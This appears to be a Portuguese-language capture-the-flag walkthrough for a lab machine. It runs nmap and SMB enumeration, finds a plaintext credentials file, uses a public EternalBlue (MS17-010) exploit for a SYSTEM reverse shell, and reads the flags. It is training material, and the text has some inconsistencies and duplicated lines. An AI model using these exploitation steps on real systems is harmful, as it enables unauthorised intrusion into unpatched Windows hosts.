### **challenges/hackthebox-style/walkthroughs/medium-corp-walkthrough.md**
```markdown
# 🏢 Medium Corp - Walkthrough Completo

## Passo 1: Reconhecimento

### Escaneamento de Portas
```bash
nmap -sC -sV -p- 10.10.10.150 -oN nmap.txt

Resultado:

PORT     STATE SERVICE    VERSION
135/tcp  open  msrpc      Microsoft Windows RPC
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
3389/tcp open  ms-wbt-server Microsoft Terminal Services
8080/tcp open  http       Microsoft IIS httpd 10.0

SMB Enumeration

smbclient -L //10.10.10.150 -N

Sharename       Type      Comment
---------       ----      -------
Public          Disk      Acesso público
Documents       Disk      Documentos internos
Backup          Disk      Backup de sistemas

Acesso ao compartilhamento Public

smbclient //10.10.10.150/Public -N

Arquivo encontrado: backup_credentials.txt

Conteúdo:

username: backup_admin
password: Backup@2024!
===========================================================================================
Passo 2: EternalBlue (MS17-010)
Verificando vulnerabilidade:

git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010
python eternal_checker.py 10.10.10.150

Vulnerável!

Exploit:

python eternal_exploit7.py 10.10.10.150

Reverse shell como SYSTEM!
===========================================================================================
Passo 3: Captura de Flags
user.txt

cd C:\Users\backup_admin\Desktop
type user.txt

cd C:\Users\backup_admin\Desktop
type user.txt

Flag: flag{medium_corp_user}

root.txt

cd C:\Users\Administrator\Desktop

type root.txt

Flag: flag{medium_corp_admin}
